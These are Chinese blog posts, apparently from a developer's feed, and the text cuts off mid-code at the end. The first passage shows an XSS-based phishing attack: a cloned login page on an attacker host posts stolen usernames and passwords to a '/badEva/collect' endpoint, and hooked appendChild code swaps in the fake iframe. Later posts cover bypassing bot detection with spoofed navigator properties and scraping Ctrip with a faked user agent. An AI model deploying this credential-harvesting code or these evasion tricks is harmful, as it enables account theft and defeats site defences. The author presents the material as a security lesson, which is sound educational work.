class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fakeIframe.innerHTML=&apos;&lt;iframe allowtransparency=&quot;true&quot; style=&quot;border:0px none;position:absolute;top:0;left:0; width:100%;height:100%;&quot;</span><br><span class="line">src=&quot;//passport.taihe.com/v2/web/popLogin.html?target=pop&amp;amp;u=https%3A%2F%2Fplay.taihe.com&amp;amp;staticPage=https%3A%2F%2Fplay.taihe.com%2Fplayer%2Ftpassjump.html&amp;amp;callback=tpass15504710495271&amp;amp;tpl=baidu_music&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;&apos;;</span><br></pre></td></tr></table></figure></p><p>本来打算自己写个iframe 登录页，转念一想，直接把他的页面copy出来算了，美观靠谱又省事儿。<br>打开//passport.taihe.com/v2/web/popLogin.html，chrome dev tool network，copy出popLogin.html的代码。<br>加上</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'.tpass-button'</span>).on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  $.ajax(&#123;</span><br><span class="line">    url: <span class="string">'/badEva/collect'</span>,</span><br><span class="line">    type: <span class="string">'POST'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      username: $(<span class="string">'.tpass-text-input-userName'</span>).val(),</span><br><span class="line">      pwd: $(<span class="string">'.tpass-text-input-password'</span>).val(),</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>部署在自己的server上，得到url如//passport.badeva.com/fakeLogin.html</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> append = <span class="built_in">document</span>.body.appendChild;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild = <span class="function"><span class="keyword">function</span>(<span class="params">el</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> fakeIframe = <span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line">  fakeIframe.innerHTML = <span class="string">'&lt;iframe allowtransparency="true" style="border:0px none;position:absolute;top:0;left:0; width:100%;height:100%;" src="//passport.badeva.com/fakeLogin.html" &gt;&lt;/iframe&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理论上四行代码就可以搞定了。</p><p>其实还有很多技术点可以细挖，先不展开说了。</p><h4 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h4><p>回想起来，这些思路还是来自于hook极验验证结果时得出来的。</p><p>引入了极验的sdk，但是用户每次滑动点选的结果对接入方来说是透明的，但是我们需要这些数据来进行分析，怎么才能得到用户每次验证的结果呢？</p><p>大家都说，页面都是你的页面，连个结果都获取不到？？？</p><p>计算每次的轨迹？</p><p>思考良久，脑子里突然闪过iOS里的method swizzling，具体是干啥的也不记得了，只记得method swizzling 黑魔法。</p><p>我的地盘我做主，怎么可能获取不到呢？</p><p>脑子里又闪过hook这个词。</p><p>对了，他们总是要给服务端结果的啊！hook他们的请求！</p><p>跨域只能jsonp，jsonp一般都是document.header.appendChild，轻轻松松得到结果，具体代码你可以自己试着写写。</p><p>但是随着时代的进步，极验也换用了CORS来进行跨域，hook Ajax就没有那么容易了。</p><h4 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h4><p>大佬们很震惊，难道没有别的办法可以防止被hook吗？其实我们还是希望可以使用iframe来提升用户体验的。</p><p>但事实上js注入之后，可以做的事儿太多了。弹出iframe绕不过appendChild那些基础API，有xss漏洞就相当于敞开大门让坏人进来。</p><p>几乎是防不胜防。</p><p>所以更是提醒我们为了安全：</p><p>1.要尽量避免xss漏洞，请看这篇（TODO）</p><p>2.引入第三方js，一定要注意查看下network中是否有什么不清不楚的接口，偷偷的搜集了某些信息上送给别的服务端。</p><p>从这篇文章获取到的，你可以自己总结下。<br>顺便思考下hook Ajax的方法。</p><h4 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h4><p>虽然很绝望，但是首先，你需要一个xss漏洞。</p><p>大佬们微微一笑，xss漏洞远比你想象的多得多，即使简单的一个登录页就这段时间都检测出来了好多xss漏洞。</p><p>iframe白名单这个口子真的不能那么容易就打开呀，公司其实有很多赶工期的项目，开发周期短，代码写成啥样大家都懂，其实很容易出现xss漏洞。</p>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;需求&quot;&gt;&lt;a href=&quot;#需求&quot; class=&quot;headerlink&quot; title=&quot;需求&quot;&gt;&lt;/a&gt;需求&lt;/h4&gt;&lt;p&gt;今天遇到有业务要求我们的登录页允许被嵌在 iframe 中以满足导流需求，找安全的大佬们讨论了下，最后给出的结论是：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;如果业务方的代码写的挫了点，有 xss 漏洞的话，坏人完全可以把你本来的 iframe 隐藏掉，自己写个弹框出来，这样的话用户完全无感知地被篡改了，直接输入用户名和密码，信息就被上送到了坏人的服务器。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;what？还能这样吗？ 那得写多少代码才能覆盖掉弹窗再伪造一个出来啊！&lt;/p&gt;
&lt;p&gt;作为一个小白我算是长见识了。但是经过尝试，其实并不是那么回事。&lt;br&gt;
    
    </summary>
    
    
      <category term="安全" scheme="https://evacoder.com/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>「 puppeteer 」从puppeteer谈前端爬虫检测和绕过</title>
    <link href="https://evacoder.com/2019/02/14/js_check_spider/"/>
    <id>https://evacoder.com/2019/02/14/js_check_spider/</id>
    <published>2019-02-14T10:20:35.000Z</published>
    <updated>2019-03-13T10:46:40.577Z</updated>
    
    <content type="html"><![CDATA[<p>检测Headless Chrome/ webdriver/ selenium/ puppeteer</p><p>爬虫检测是一个攻防的过程，js是裸露在外的，在坏人手里的，我们只能想办法提高作恶的成本。</p><p>各处搜集整理信息了很久，后来发现 <a href="https://intoli.com/blog/not-possible-to-block-chrome-headless/" target="_blank" rel="noopener">这篇文章</a> 讲的非常清楚，本地化一下，加上一些自己的理解。</p><p>phantom，webdriver，puppeteer等爬虫都有设置的方法，本文主要从puppeteer来分析。</p><a id="more"></a><h4 id="1-navigator-userAgent"><a href="#1-navigator-userAgent" class="headerlink" title="1.navigator.userAgent"></a>1.navigator.userAgent</h4><p>防：<code>/HeadlessChrome/.test(window.navigator.userAgent)</code>一般判断ua中有headless字样都没跑了，肯定是爬虫。<br>攻：puppeteer可以设置ua，甚至直接设置device。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.setViewport(conf.viewport);</span><br><span class="line"><span class="keyword">await</span> page.setUserAgent(conf.ua);</span><br><span class="line"><span class="keyword">await</span> page.emulate(conf.device);</span><br></pre></td></tr></table></figure><h4 id="2-检测webdriver标志字段"><a href="#2-检测webdriver标志字段" class="headerlink" title="2.检测webdriver标志字段"></a>2.检测webdriver标志字段</h4><p>防：检测window object中是否有任何<code>selenium/webdriver/$cdc_/$wdc_</code>等字样。</p><p>以下是搜索到的字段标志，只测试了在正常访问状态下并没有这些字段。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// webdriver keywords</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectWebDriver</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> r = [];</span><br><span class="line"><span class="keyword">const</span> w = [<span class="string">'webdriver'</span>, <span class="string">'__driver_evaluate'</span>, <span class="string">'__webdriver_evaluate'</span>,</span><br><span class="line"><span class="string">' __selenium_evaluate'</span>, <span class="string">'__fxdriver_evaluate'</span>, <span class="string">'__driver_unwrapped'</span>,</span><br><span class="line"><span class="string">'__webdriver_unwrapped'</span>, <span class="string">'__selenium_unwrapped'</span>, <span class="string">'__fxdriver_unwrapped'</span>,</span><br><span class="line"><span class="string">'_Selenium_IDE_Recorder'</span>, <span class="string">'_selenium'</span>, <span class="string">'calledSelenium'</span>,</span><br><span class="line"><span class="string">'_WEBDRIVER_ELEM_CACHE'</span>, <span class="string">'ChromeDriverw'</span>, <span class="string">'driver-evaluate'</span>,</span><br><span class="line"><span class="string">'webdriver-evaluate'</span>, <span class="string">'selenium-evaluate'</span>, <span class="string">'webdriverCommand'</span>,</span><br><span class="line">  <span class="string">'webdriver-evaluate-response'</span>,<span class="string">'__webdriverFunc'</span>, <span class="string">'__webdriver_script_fn'</span>,</span><br><span class="line">  <span class="string">'__$webdriverAsyncExecutor'</span>, <span class="string">'__lastWatirAlert'</span>,</span><br><span class="line"><span class="string">'__lastWatirConfirm'</span>, <span class="string">'__lastWatirPrompt'</span>, <span class="string">'$chrome_asyncScriptInfo'</span>,</span><br><span class="line">  <span class="string">'$cdc_asdjflasutopfhvcZLmcfl_'</span>, <span class="string">'_phantom'</span>, <span class="string">'_phantomas'</span>];</span><br><span class="line">w.forEach(<span class="function">(<span class="params">t</span>) =&gt;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (!!<span class="built_in">window</span>[t] || !!<span class="built_in">window</span>.document.documentElement.getAttribute(t) || !!navigator[t]) &#123;</span><br><span class="line">r.push(t);</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>人力限制不一个个测试了，不放心的话前期先记录下命中词，之后可以只要遇到命中词就拉黑拒绝提供服务。</p><p>攻：使用puppeteer会检测到webdriver，navigator.webdriver为true。</p><p>试着加上了<code>navigator.webdriver=false</code>实际上并不会生效，console出来依然是false。</p><p><code>const isAutomated = navigator.webdriver</code></p><p>这个字段就是标志了一切自动化。</p><p><code>navigator.userAgent=&#39;test&#39;</code>设置了再console也是无效的。</p><p>实际上可以使用Object.defineProperty来修改原生对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.evaluate(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(navigator, <span class="string">'webdriver'</span>, &#123; <span class="attr">get</span>: <span class="function"><span class="params">()</span>=&gt;</span> <span class="literal">false</span> &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>但是对于反爬方来说，一般在你进入页面的时候就已经开始检测是否是爬虫，立即停止服务了，在puppeteer中篡改已经晚了。</p><p>这种时候可以通过<strong>代理工具</strong>，fiddler，charles都可以完成js的注入。</p><ul><li>在检测爬虫的js前加上以上的篡改js。</li><li>或者先在正常状态下分析下源码具体检测爬虫的代码，使用代理工具，去掉识别webdriver的js（或者直接返回不是爬虫）之后再继续爬，当然这很难。</li></ul><p>前面说了js是裸奔的，顶多代码混淆下，但是也是在坏人手里的，想怎么改怎么改，只能说提高坏人作恶的成本。</p><p>防御方只能进行更大强度的代码混淆（其实也没啥用）。</p><h4 id="3-window-chrome"><a href="#3-window-chrome" class="headerlink" title="3.window.chrome"></a>3.window.chrome</h4><p>防：<code>!window.chrome||!window.chrome.runtime</code>如果是自动化的话，window.chrome会是undefined</p><p>攻：经测试puppeteer设置headless:true时，window.chrome是有值的，虽然会慢一点。或者反正也能篡改js。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.navigator.chrome = &#123;</span><br><span class="line">runtime: &#123;&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还有其他的检测plugins，language以及permissions，实际都可以被篡改。</p><p>看完是不是觉得非常悲观，怎么也拦不住！</p><p>还是那句话，能拦多少拦多少呗！</p><p>搞一些骚气一点的走位，其实你也发现不了我在哪里检测了</p><p>基本检测方式如下，当然还有很多别的指标来判断，我才不会告诉你。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">detectAuto</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="regexp">/HeadlessChrome/</span>.test(navigator.userAgent) || <span class="comment">// ua test</span></span><br><span class="line">    !<span class="built_in">window</span>.chrome || <span class="comment">// headless test</span></span><br><span class="line">    navigator.plugins.length === <span class="number">0</span> || <span class="comment">//plugins test</span></span><br><span class="line">    <span class="comment">// languages test</span></span><br><span class="line">    !navigator.languages || navigator.languages.length === <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> permissionStatus = <span class="keyword">await</span> navigator.permissions.query(&#123; <span class="attr">name</span>: <span class="string">'notifications'</span> &#125;);</span><br><span class="line">  <span class="keyword">if</span> (Notification.permission === <span class="string">'denied'</span> &amp;&amp; permissionStatus.state === <span class="string">'prompt'</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">const</span> r = [];</span><br><span class="line">  <span class="keyword">const</span> w = [<span class="string">'webdriver'</span>, <span class="string">'__driver_evaluate'</span>, <span class="string">'__webdriver_evaluate'</span>,</span><br><span class="line">    <span class="string">' __selenium_evaluate'</span>, <span class="string">'__fxdriver_evaluate'</span>, <span class="string">'__driver_unwrapped'</span>,</span><br><span class="line">    <span class="string">'__webdriver_unwrapped'</span>, <span class="string">'__selenium_unwrapped'</span>, <span class="string">'__fxdriver_unwrapped'</span>,</span><br><span class="line">    <span class="string">'_Selenium_IDE_Recorder'</span>, <span class="string">'_selenium'</span>, <span class="string">'calledSelenium'</span>,</span><br><span class="line">    <span class="string">'_WEBDRIVER_ELEM_CACHE'</span>, <span class="string">'ChromeDriverw'</span>, <span class="string">'driver-evaluate'</span>,</span><br><span class="line">    <span class="string">'webdriver-evaluate'</span>, <span class="string">'selenium-evaluate'</span>, <span class="string">'webdriverCommand'</span>, <span class="string">'webdriver-evaluate-response'</span>,</span><br><span class="line">    <span class="string">'__webdriverFunc'</span>, <span class="string">'__webdriver_script_fn'</span>, <span class="string">'__$webdriverAsyncExecutor'</span>, <span class="string">'__lastWatirAlert'</span>,</span><br><span class="line">    <span class="string">'__lastWatirConfirm'</span>, <span class="string">'__lastWatirPrompt'</span>, <span class="string">'$chrome_asyncScriptInfo'</span>, <span class="string">'$cdc_asdjflasutopfhvcZLmcfl_'</span>,</span><br><span class="line">    <span class="string">'_phantom'</span>, <span class="string">'_phantomas'</span>,</span><br><span class="line">  ];</span><br><span class="line">  w.forEach(<span class="function">(<span class="params">t</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!!<span class="built_in">window</span>[t] || !!<span class="built_in">window</span>.document.documentElement.getAttribute(t) || !!navigator[t]) &#123;</span><br><span class="line">      r.push(t);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> r.length &gt; <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>绕过js已整理好，但是还是不分享给你们这群坏人了。</p><p>参考：</p><p><a href="https://intoli.com/blog/not-possible-to-block-chrome-headless/" target="_blank" rel="noopener">https://intoli.com/blog/not-possible-to-block-chrome-headless/</a></p><p><a href="https://intoli.com/blog/making-chrome-headless-undetectable/" target="_blank" rel="noopener">https://intoli.com/blog/making-chrome-headless-undetectable/</a></p><p><a href="https://www.zhihu.com/question/50738719" target="_blank" rel="noopener">https://www.zhihu.com/question/50738719</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;检测Headless Chrome/ webdriver/ selenium/ puppeteer&lt;/p&gt;
&lt;p&gt;爬虫检测是一个攻防的过程，js是裸露在外的，在坏人手里的，我们只能想办法提高作恶的成本。&lt;/p&gt;
&lt;p&gt;各处搜集整理信息了很久，后来发现 &lt;a href=&quot;https://intoli.com/blog/not-possible-to-block-chrome-headless/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;这篇文章&lt;/a&gt; 讲的非常清楚，本地化一下，加上一些自己的理解。&lt;/p&gt;
&lt;p&gt;phantom，webdriver，puppeteer等爬虫都有设置的方法，本文主要从puppeteer来分析。&lt;/p&gt;
    
    </summary>
    
    
      <category term="puppeteer" scheme="https://evacoder.com/tags/puppeteer/"/>
    
  </entry>
  
  <entry>
    <title>「 puppeteer 」puppeteer初尝试</title>
    <link href="https://evacoder.com/2019/02/13/puppeteer_try/"/>
    <id>https://evacoder.com/2019/02/13/puppeteer_try/</id>
    <published>2019-02-13T10:20:35.000Z</published>
    <updated>2019-03-13T10:56:06.549Z</updated>
    
    <content type="html"><![CDATA[<p>上一篇中我们通过自己手写代码完成了抓取list页中的基本数据，可是沙沙又提出了新的需求，如何抓取到每个酒店的装修时间和客房数量呢？我让她自己去研究八爪鱼去了，但是如果是真的撩妹，这可不就前功尽弃了。</p><p>正好最近在研究反作弊中判断是否是webdriver，headless chrome，发现一个神器puppeteer，不需要学习python，用nodeJS就可以搞定，我的键盘已经等不及了，用了一天时间研究，分享给大家。</p><p>其实主要是async和await的理解不够深刻，多花费了时间，实际上聪明如你半个小时应该就可以学会。</p><a id="more"></a><h4 id="puppeteer"><a href="#puppeteer" class="headerlink" title="puppeteer"></a>puppeteer</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建个项目安装puppeteer</span></span><br><span class="line">npm i puppeteer -S</span><br></pre></td></tr></table></figure><p>官方demo就很容易上手，再加上awesome-puppeteer中的<a href="https://medium.com/@e_mad_ehsan/getting-started-with-puppeteer-and-chrome-headless-for-web-scrapping-6bf5979dee3e" target="_blank" rel="noopener">例子</a>，很容易就可以实现自己的目标。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">'puppeteer'</span>);</span><br><span class="line"></span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> conf = &#123;</span><br><span class="line">    <span class="comment">// 还是携程上海五角场江湾地区的url</span></span><br><span class="line">    workUrl: <span class="string">'http://hotels.ctrip.com/hotel/shanghai2/zone368#ctm_ref=hod_hp_sb_lst'</span>,</span><br><span class="line">    <span class="comment">// 设置ua，不然ua中包含headless，会被识别出来，拒绝提供服务</span></span><br><span class="line">    ua: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36'</span>,</span><br><span class="line">    viewport: &#123;</span><br><span class="line">      width: <span class="number">1920</span>,</span><br><span class="line">      height: <span class="number">1080</span>,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> browserSetting = &#123;</span><br><span class="line">    <span class="comment">// 默认是headless的模式打开的,改为false可以打开实际的chrome，方便我们查看</span></span><br><span class="line">    <span class="comment">// 但是设置为true会快很多</span></span><br><span class="line">    headless: <span class="literal">false</span>,</span><br><span class="line">    <span class="comment">// 或者直接打开指定path的chrome，最好还是使用默认提供的chromium</span></span><br><span class="line">    executablePath: <span class="string">'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe'</span>,</span><br><span class="line">    <span class="comment">// 设置后可以操作慢点方便调试</span></span><br><span class="line">    <span class="comment">// slowMo: 250,</span></span><br><span class="line">    <span class="comment">// 打开F12</span></span><br><span class="line">    devtools: <span class="literal">true</span>,</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(browserSetting);</span><br><span class="line">  <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">  <span class="comment">// 页面设置</span></span><br><span class="line">  <span class="keyword">await</span> page.setViewport(conf.viewport);</span><br><span class="line">  <span class="keyword">await</span> page.setUserAgent(conf.ua);</span><br><span class="line">  <span class="comment">// await page.emulate(conf.device);</span></span><br><span class="line">  <span class="comment">// 页面跳转</span></span><br><span class="line">  <span class="keyword">await</span> page.goto(conf.workUrl);</span><br><span class="line">  <span class="comment">// page.$$(sel);= document.querySelectorAll(sel)</span></span><br><span class="line">  <span class="comment">// page.$(sel);= document.querySelector(sel)</span></span><br><span class="line">  <span class="comment">// page.$eval(sel);</span></span><br><span class="line">  <span class="comment">// page.$$eval(sel);</span></span><br><span class="line">  <span class="comment">// const els = await page.$$eval('p', els =&gt; els);// 奇怪的是这样得到的els里的元素都是&#123;&#125;</span></span><br><span class="line">  <span class="comment">// 改为</span></span><br><span class="line">  <span class="comment">// const elsHtml = await page.$$eval('p', els =&gt; els.map(el =&gt; el.innerHTML));</span></span><br><span class="line">  <span class="comment">// console.log(elsHtml);</span></span><br><span class="line">  <span class="comment">// 但个人觉得可以直接js实现的就不必用 puppeteer api，记一堆api不如用好js</span></span><br><span class="line">  <span class="keyword">const</span> hotels = <span class="keyword">await</span> page.evaluate(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="comment">// 这里可以直接执行js代码了</span></span><br><span class="line">    <span class="keyword">const</span> resArr = [];</span><br><span class="line">    <span class="keyword">let</span> timer = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 注意此处的异步操作</span></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getRes</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="comment">// return new Promise((resolve, reject) =&gt; &#123;</span></span><br><span class="line">          <span class="comment">// 因为ctrip本来就有jQuery，所以可以直接使用</span></span><br><span class="line">          <span class="keyword">const</span> num = $(<span class="string">'.hotel_item'</span>).length;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; num; i++) &#123;</span><br><span class="line">            <span class="keyword">const</span> item = $(<span class="string">'.hotel_item:eq('</span> + i + <span class="string">')'</span>);</span><br><span class="line">            <span class="keyword">const</span> hotel = &#123;</span><br><span class="line">              name: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'title'</span>)&#125;</span>`</span>,</span><br><span class="line">              address: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_item_htladdress'</span>).text().replace(<span class="regexp">/地图|街景/g</span>, <span class="string">''</span>)&#125;</span>`</span>,</span><br><span class="line">              url: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_name a'</span>).attr(<span class="string">'href'</span>).replace(<span class="regexp">/\?.*/g</span>, <span class="string">''</span>)&#125;</span>`</span>,</span><br><span class="line">              rate: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.hotel_value'</span>).text()&#125;</span>`</span>,</span><br><span class="line">              price: <span class="string">`<span class="subst">$&#123;item.find(<span class="string">'.J_price_lowList'</span>).text()&#125;</span>`</span>,</span><br><span class="line">            &#125;;</span><br><span class="line">            resArr.push(hotel);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">let</span> $nextBtn = $(<span class="string">'.c_down'</span>);</span><br><span class="line">          <span class="keyword">if</span> ($nextBtn.length) &#123;</span><br><span class="line">            $nextBtn.click();</span><br><span class="line">            timer = setTimeout(getData, <span class="number">1000</span>);</span><br><span class="line">            $nextBtn = <span class="literal">null</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            clearTimeout(timer);</span><br><span class="line">            resolve(resArr);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        getData();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 加debugger可以在打开的chrome里调试js</span></span><br><span class="line">    <span class="comment">// debugger;</span></span><br><span class="line">    <span class="keyword">return</span> getRes();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>以上功能都可以直接按上一篇在chrome snippet中实现，但是如果需要自动获取detail信息，就需要puppeteer来帮我们操作了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 开始获取detail</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">getDetail</span>(<span class="params">h</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> nh = h;</span><br><span class="line">  <span class="keyword">await</span> page.goto(<span class="string">`http://hotels.ctrip.com<span class="subst">$&#123;h.url&#125;</span>`</span>);</span><br><span class="line">  nh.info = <span class="keyword">await</span> page.evaluate(<span class="function"><span class="params">()</span> =&gt;</span> $(<span class="string">'#htlDes&gt;p'</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].data);</span><br><span class="line">  <span class="keyword">return</span> nh;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 数量太多测试时间太长，先测试4个试下</span></span><br><span class="line">hotels.length = <span class="number">4</span>;</span><br><span class="line"><span class="comment">// 此处await不能使用forEach，await不能放在循环中，使用promise.all</span></span><br><span class="line"><span class="comment">// 参见http://es6.ruanyifeng.com/#docs/async</span></span><br><span class="line"><span class="keyword">const</span> promises = hotels.map(<span class="function"><span class="params">h</span> =&gt;</span> getDetail(h));</span><br><span class="line"><span class="keyword">await</span> <span class="built_in">Promise</span>.all(promises);</span><br><span class="line"><span class="built_in">console</span>.log(hotels);</span><br></pre></td></tr></table></figure><p>node直接写入csv文件</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 